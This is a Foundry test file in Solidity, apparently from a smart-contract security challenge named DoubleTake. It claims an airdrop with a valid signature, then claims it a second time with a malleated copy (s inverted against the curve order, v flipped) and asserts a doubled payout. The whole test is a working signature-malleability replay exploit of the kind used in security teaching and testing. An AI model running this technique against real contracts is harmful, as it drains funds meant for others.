// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DoubleTake} from "../src/DoubleTake.sol";

contract DoubleTakeTest is Test {
    DoubleTake doubleTake;
    address Alice;
    uint256 privateKey;

    function setUp() public {
        (Alice, privateKey) = makeAddrAndKey("Alice");
        doubleTake = new DoubleTake{value: 100 ether}(Alice);
    }

    function test_claimAirdrop() public {
        bytes32 hash = keccak256(abi.encode(Alice, 1 ether));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
        doubleTake.claimAirdrop(Alice, 1 ether, v, r, s);

        uint256 balance = Alice.balance;
        assertEq(balance, 1 ether, "Alice should have received 1 ether");

        // Number of points in the field
        uint256 N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

        // Invert s: s' = N - s
        bytes32 sMalleated = bytes32(N - uint256(s));

        // Switch v: 27 <-> 28
        uint8 vMalleated = v == 27 ? 28 : 27;

        doubleTake.claimAirdrop(Alice, 1 ether, vMalleated, r, sMalleated);
        assertEq(Alice.balance, 2 ether);
    }
}
